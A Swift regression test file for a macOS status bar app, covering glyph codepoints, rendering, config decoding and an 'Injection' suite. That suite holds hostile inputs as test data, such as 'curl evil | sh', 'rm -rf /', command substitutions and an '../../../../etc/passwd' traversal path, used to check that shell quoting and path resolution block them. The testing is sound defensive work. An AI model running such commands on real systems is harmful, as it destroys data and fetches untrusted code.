import Foundation
import TestKit
import FunkyBarCore
import FunkyBarProviders

// Regressions for defects found by looking at the bar next to sketchybar.
// Each one was invisible to the rest of the suite, which is the point.

private var packageRoot: URL {
    URL(fileURLWithPath: #filePath)
        .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
}

private func exampleConfig() throws -> Config {
    let source = try String(
        contentsOf: packageRoot.appendingPathComponent("funkybar.toml.example"),
        encoding: .utf8
    )
    return ConfigDecoder.decode(try TOMLParser.parse(source)).config
}

private func item(_ config: Config, _ id: String) -> ItemConfig? {
    config.allItems.first { $0.id == id }
}

let glyphRegressionTests = Suite("Glyph integrity") { s in

    // The nerd-font icons are 5 hex digits (U+F048D). An earlier version of the
    // config had every one of them truncated to 4 digits with the fifth leaking
    // through as a stray ASCII character, so `U+F099E` became `U+F099` + "E".
    // The bar rendered a wrong glyph followed by a letter and nothing caught it.
    let expected: [(item: String, state: String?, codepoint: UInt32, name: String)] = [
        ("ports", nil,      0xF048D, "network"),
        ("toggle", "ON",    0xF099D, "shield-check"),
        ("toggle", "OFF",   0xF099E, "shield-off"),
    ]

    for entry in expected {
        let label = entry.state.map { "\(entry.item).\($0)" } ?? entry.item
        s.test("\(label) icon is exactly U+\(String(entry.codepoint, radix: 16, uppercase: true))") { t in
            let target = try t.require(try Fixture.item(entry.item), "no item '\(entry.item)'")

            let text: String
            if let state = entry.state {
                let spec = try t.require(target.states[state], "no state '\(state)'")
                text = try t.require(spec.icon, "state has no icon").source
            } else {
                text = target.icon.template.source
            }

            let scalars = Array(text.unicodeScalars)
            t.expectEqual(scalars.count, 1, "\(label) icon should be one scalar, got \(scalars.count): \(text.debugDescription)")
            guard let first = scalars.first else { return }
            t.expectEqual(first.value, entry.codepoint, "expected \(entry.name)")
        }
    }

    s.test("the battery ramp is five single-scalar glyphs, low to high") { t in
        let battery = try t.require(try Fixture.item("battery"))
        let options = try t.require(battery.provider?.options)

        guard case .array(let nodes)? = options["ramp"]?.value else {
            t.fail("battery provider has no ramp array")
            return
        }
        let glyphs: [String] = nodes.compactMap { if case .string(let g) = $0.value { g } else { nil } }
        t.expectEqual(glyphs.count, 5)

        // From battery.sh: empty, low, mid, high, full.
        let expected: [UInt32] = [0xF0083, 0xF007B, 0xF007E, 0xF0080, 0xF0082]
        for (glyph, want) in zip(glyphs, expected) {
            let scalars = Array(glyph.unicodeScalars)
            t.expectEqual(scalars.count, 1, "ramp glyph \(glyph.debugDescription) should be one scalar")
            t.expectEqual(scalars.first?.value, want)
        }

        guard case .string(let charging)? = options["charging"]?.value else {
            t.fail("battery provider has no charging glyph")
            return
        }
        t.expectEqual(Array(charging.unicodeScalars).count, 1)
        t.expectEqual(charging.unicodeScalars.first?.value, 0xF0084)
    }

    s.test("no icon or label carries a stray ASCII tail") { t in
        // The general shape of the corruption: a private-use scalar immediately
        // followed by an ASCII character. Nothing in this config legitimately
        // does that. Checked across both the fixture and the shipped example.
        let config = try exampleConfig()

        func check(_ text: String, _ where_: String) {
            let scalars = Array(text.unicodeScalars)
            for (index, scalar) in scalars.enumerated() where (0xE000 ... 0xFFFFD).contains(scalar.value) {
                guard index + 1 < scalars.count else { continue }
                let next = scalars[index + 1]
                t.expect(
                    !(next.value < 0x80 && next.value > 0x20),
                    "\(where_): private-use U+\(String(scalar.value, radix: 16, uppercase: true)) "
                    + "followed by ASCII '\(Character(next))' looks like a truncated codepoint"
                )
            }
        }

        for target in (config.allItems + (try Fixture.config()).allItems) {
            check(target.icon.template.source, "\(target.id).icon")
            check(target.label.template.source, "\(target.id).label")
            for (name, state) in target.states {
                if let icon = state.icon { check(icon.source, "\(target.id).states.\(name).icon") }
                if let label = state.label { check(label.source, "\(target.id).states.\(name).label") }
            }
        }
    }
}

let renderRegressionTests = Suite("Render regressions") { s in

    s.test("a ports item renders a label, not just an icon") { t in
        // The ports provider emits a `label` field. Nothing consumed it, so the
        // item drew an icon and no text at all.
        let ports = try t.require(try Fixture.item("ports"))
        t.expect(!ports.label.template.source.isEmpty, "no label template")
        t.expectEqual(ports.label.template.fields.contains("label"), true)
    }

    s.test("a transparent fill with an image still counts as visible") { t in
        // An item set drawing = false to hide its fill. That suppressed the
        // whole background layer, and the image rides on it, so the artwork
        // never drew.
        var style = StyleSpec()
        style.color = .clear
        style.borderWidth = 0
        style.image = ImageSpec(path: Template("/tmp/x.png"))
        t.expectEqual(style.isVisible, true, "an image alone should be worth drawing")

        style.drawing = false
        t.expectEqual(style.isVisible, false, "drawing = false still wins")
    }

    s.test("image paths substitute provider fields") { t in
        // `icons/{repeat}.png` was stored as a literal String, so every clone
        // asked for a file called "{repeat}.png".
        var config = ItemConfig(id: "meter.b")
        config.repeatValue = "b"
        var style = StyleSpec()
        style.image = ImageSpec(path: Template("/icons/{repeat}.png"))
        config.style = style

        let resolved = ItemResolver.resolve(config)
        t.expectEqual(resolved.style.image?.resolvedPath, "/icons/b.png")
    }

    s.test("image paths expand a leading tilde after substitution") { t in
        var config = ItemConfig(id: "a")
        var style = StyleSpec()
        style.image = ImageSpec(path: Template("~/icons/x.png"))
        config.style = style

        let resolved = try t.require(ItemResolver.resolve(config).style.image?.resolvedPath)
        t.expect(!resolved.hasPrefix("~"), "tilde should be expanded, got \(resolved)")
        t.expectContains(resolved, "/icons/x.png")
    }

    s.test("a repeated group declares its real on-screen order") { t in
        // Upstream relied on right-side reverse insertion, so the same list
        // would come out backwards. Here declaration order is visual order.
        var values: [String] = []
        for case .group(let group) in (try Fixture.config()).nodes where group.id == "meters" {
            values = group.items.compactMap(\.repeatValue)
        }
        t.expectEqual(values, ["a", "b", "c"])
    }

    s.test("each repeated item resolves its own artwork path") { t in
        var resolved: [String] = []
        for case .group(let group) in (try Fixture.config()).nodes where group.id == "meters" {
            for clone in group.items {
                guard clone.style.image != nil else {
                    t.fail("\(clone.id) has no image")
                    continue
                }
                resolved.append(try t.require(ItemResolver.resolve(clone).style.image?.resolvedPath))
            }
        }
        t.expectEqual(resolved, [
            "/tmp/funkybar-icons/a.png",
            "/tmp/funkybar-icons/b.png",
            "/tmp/funkybar-icons/c.png",
        ])
    }
}

let seedRegressionTests = Suite("Seed file regressions") { s in

    s.test("battery consumes the provider's icon field") { t in
        // [item.icon] set only padding, so the ramp glyph the provider emits
        // had no template to land in and the battery drew no icon at all.
        let battery = try t.require(try Fixture.item("battery"))
        t.expectEqual(battery.icon.template.fields.contains("icon"), true,
                      "battery icon template is \(battery.icon.template.source.debugDescription)")
    }

    s.test("a multi-value seed splits on whitespace by default") { t in
        // A state file holding "1 2 3" is exactly what `read -r a b c < file`
        // expects. An earlier version assumed a middle-dot separator, so the
        // whole line landed in the first clone.
        var options: TOMLTable?
        for case .group(let group) in (try Fixture.config()).nodes where group.id == "meters" {
            options = group.items.first?.provider?.options
        }
        let opts = try t.require(options, "no provider options")

        guard case .array(let keys)? = opts["seed_keys"]?.value else {
            t.fail("no seed_keys")
            return
        }
        let names: [String] = keys.compactMap { if case .string(let k) = $0.value { k } else { nil } }
        t.expectEqual(names, ["a", "b", "c"], "seed order must match declaration order")
        t.expectNil(opts["seed_separator"], "whitespace is the default")
    }
}

let popupAlignmentTests = Suite("Popup row alignment") { s in

    s.test("defaults to columns, and the option is honoured") { t in
        let base = """
        [[item]]
        id = "x"
        [item.popup]
        on = "click"
        """
        var outcome = ConfigDecoder.decode(try TOMLParser.parse(base))
        t.expectEqual(outcome.config.allItems.first?.popup?.rowAlignment, .columns)

        outcome = ConfigDecoder.decode(try TOMLParser.parse(base + "\nrows = \"compact\"\n"))
        t.expectEqual(outcome.config.allItems.first?.popup?.rowAlignment, .compact)
        t.expectEqual(outcome.diagnostics.hasErrors, false)
    }

    s.test("an unknown alignment is rejected with the options listed") { t in
        let outcome = ConfigDecoder.decode(try TOMLParser.parse("""
        [[item]]
        id = "x"
        [item.popup]
        on = "click"
        rows = "sideways"
        """))
        let error = try t.require(outcome.diagnostics.errors.first)
        t.expectContains(error.message, "not one of the allowed values")
        t.expectContains(try t.require(error.hint), "compact")
    }

    s.test("the example config states its choice rather than relying on a default") { t in
        // The difference from sketchybar's popup is deliberate, so the config
        // says so out loud; an unexplained difference is indistinguishable
        // from a bug.
        let popup = try t.require(try Fixture.item("ports")?.popup)
        t.expectEqual(popup.rowAlignment, .columns)
    }
}

let regressionSuites: [Suite] = [
    injectionTests,
    popupAlignmentTests,
    providerCommandTests,
    seedRegressionTests,
    glyphRegressionTests,
    renderRegressionTests,
]

let providerCommandTests = Suite("Provider commands") { s in

    s.test("an item binds a command the provider can find") { t in
        // The click and the action both resolved correctly in the event trace,
        // so a dead button means the command never reached the provider.
        let status = try t.require(try Fixture.item("toggle"))
        let binding = try t.require(status.provider, "no provider")

        guard case .table(let commands)? = binding.options["commands"]?.value else {
            t.fail("provider options have no [commands] table; keys: \(binding.options.keys)")
            return
        }
        t.expect(commands["flip"] != nil, "no flip command; have \(commands.keys)")

        guard case .string(let flip)? = commands["flip"]?.value else {
            t.fail("flip is not a string")
            return
        }
        t.expectContains(flip, "funkybar-test-command")
    }

    s.test("the left click resolves to that provider command") { t in
        let item = try t.require(try Fixture.item("toggle"))
        t.expectEqual(item.actions[.left], .provider(name: "toggle", command: "flip"))
    }
}

let injectionTests = Suite("Injection") { s in

    s.test("shell quoting neutralises metacharacters") { t in
        // An AeroSpace workspace name is whatever created it chose, and it
        // reaches `aerospace workspace <name>`.
        for hostile in ["1; curl evil | sh", "$(whoami)", "`id`", "a && rm -rf /", "x|y", "a\nb"] {
            let quoted = hostile.shellQuoted
            t.expect(quoted.hasPrefix("'") && quoted.hasSuffix("'"),
                     "\(hostile.debugDescription) should be fully quoted, got \(quoted)")
        }
    }

    s.test("an embedded single quote cannot break out") { t in
        // The one character single quotes cannot themselves contain.
        let quoted = "it's; rm -rf /".shellQuoted
        t.expectEqual(quoted, #"'it'\''s; rm -rf /'"#)
    }

    s.test("quoting survives a real shell round trip") { t in
        // The point is not the string shape but that sh sees one argument.
        let runner = ProcessRunner(timeout: 5)
        for hostile in ["1; echo PWNED", "$(echo PWNED)", "`echo PWNED`", "a' ; echo PWNED ; '"] {
            guard case .success(let result) =
                runner.runSynchronously("printf %s \(hostile.shellQuoted)") else {
                t.fail("spawn failed")
                continue
            }
            t.expectEqual(result.standardOutput, hostile,
                          "shell altered \(hostile.debugDescription)")
            t.expect(!result.standardOutput.contains("PWNED\n"), "command substitution ran")
        }
    }

    s.test("an image path cannot traverse upward out of its directory") { t in
        var config = ItemConfig(id: "space.evil")
        config.repeatValue = "../../../../etc/passwd"
        var style = StyleSpec()
        style.image = ImageSpec(path: Template("~/.config/funkybar/icons/{repeat}.png"))
        config.style = style

        let resolved = ItemResolver.resolve(config)
        t.expectNil(resolved.style.image?.resolvedPath,
                    "a traversing path should resolve to nothing, not to the target")
    }

    s.test("an ordinary image path still resolves") { t in
        var config = ItemConfig(id: "meter.b")
        config.repeatValue = "b"
        var style = StyleSpec()
        style.image = ImageSpec(path: Template("/icons/{repeat}.png"))
        config.style = style
        t.expectEqual(ItemResolver.resolve(config).style.image?.resolvedPath, "/icons/b.png")
    }
}
